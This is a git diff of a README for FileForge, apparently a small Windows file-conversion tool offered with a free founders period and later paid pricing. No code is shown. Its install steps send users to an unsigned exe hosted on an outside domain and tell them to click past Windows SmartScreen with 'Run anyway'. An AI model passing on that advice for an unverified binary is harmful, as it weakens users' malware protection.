@@ -2,62 +2,72 @@
 
 # FileForge
 
-### Convert files without installing a suite
+**Windows file converter. One zip. No suite.**
 
-**KERNELX desktop tool · founders build · 180 days free**
+[Live site](https://rairaisaqlain-rgb.github.io/fileforge/) · [Download](https://pannki.com/fileforge.zip) · [KERNELX](https://github.com/rairaisaqlain-rgb)
 
-[Download ZIP](https://pannki.com/fileforge.zip) · [Landing](./apps/web/index.html) · [Offer](./docs/OFFER.md) · [Org](https://github.com/rairaisaqlain-rgb)
-
-<img src="https://img.shields.io/badge/status-founders-2ea44f?style=for-the-badge" />
-<img src="https://img.shields.io/badge/download-pannki.com-black?style=for-the-badge" />
-<img src="https://img.shields.io/badge/windows-.exe-0078D6?style=for-the-badge" />
+`founders` · `windows` · `180-day free window`
 
 </div>
 
 ---
 
-## Overview
+## What this is
 
-FileForge is a small converter for the jobs people actually search: JPG ↔ PDF, PNG ↔ JPG, TXT → PDF. Founders get unlimited use for six months. Day 181 is $9/mo unless you cancel.
+FileForge is a small Windows program for the conversions people type into a search bar every day:
 
-### Philosophy
+- JPG → PDF and PDF → image where the build supports it
+- PNG ↔ JPG
+- TXT → PDF
 
-*One tool. One zip. No suite installer.*
+It is **not** Adobe Acrobat, Smallpdf, or a 40-tool web dashboard. It is a founders desktop build shipped as a zip from [pannki.com/fileforge.zip](https://pannki.com/fileforge.zip).
 
----
+## Who it is for
 
-## Download
+Freelancers and office staff in the US who need a file out in 30 seconds and do not want another subscription on day one.
 
-| Platform | Package | Status | Link |
-| --- | --- | --- | --- |
-| Windows | FileForge.exe inside zip | 🟢 live | [fileforge.zip](https://pannki.com/fileforge.zip) |
+## Who it is not for
 
-```text
-https://pannki.com/fileforge.zip
+- OCR of scanned books
+- 2 GB video remux
+- a public conversion API
+- macOS / Linux (not in this zip)
+
+## Install
+
+1. Download [fileforge.zip](https://pannki.com/fileforge.zip)
+2. Unzip
+3. Run `fileforge.exe`
+4. If SmartScreen appears: More info → Run anyway. The binary is unsigned on purpose for this cohort — we do not pretend it is an EV-signed vendor pack.
+
+## Commercial terms
+
+| Window | Price | Cap |
+| --- | --- | --- |
+| 2026-09-17 → 2027-03-16 | $0 | founders, no daily cap |
+| From day 181 | $9 / month | or fall back to 3 conversions / day |
+
+No card is collected during founders access. Cancel before day 181 and you pay nothing.
+
+## Repo layout
+
+```
+fileforge/
+├─ index.html          product site (GitHub Pages)
+├─ download.html
+├─ docs.html
+├─ site.css
+├─ apps/web            earlier draft landing
+├─ apps/engine         format router stub
+└─ docs/OFFER.md
 ```
 
-Windows may warn on an unsigned exe. That is SmartScreen, not a crash.
+Site: https://rairaisaqlain-rgb.github.io/fileforge/
 
----
+## Status
 
-## Repo map
+Public founders drop. Treat the exe as an early build. Report broken conversions as GitHub issues — do not open issues asking for a full Adobe clone.
 
-```text
-FileForge/
-├─ apps/web          landing
-├─ apps/engine       convert stub
-├─ docs/OFFER.md     pricing + founders window
-└─ README.md
-```
+## License / use
 
----
-
-## Disclaimer
-
-> Founders access is a time-boxed license, not forever-free hosting.
-> Do not upload other people’s documents to random converters if the build starts using a server.
-> KERNELX is not Smallpdf and does not claim their trademarks.
-
----
-
-*FileForge — KERNELX lab*
+KERNELX lab software. You may use the founders build for your own files. You may not resell the exe as your own product.
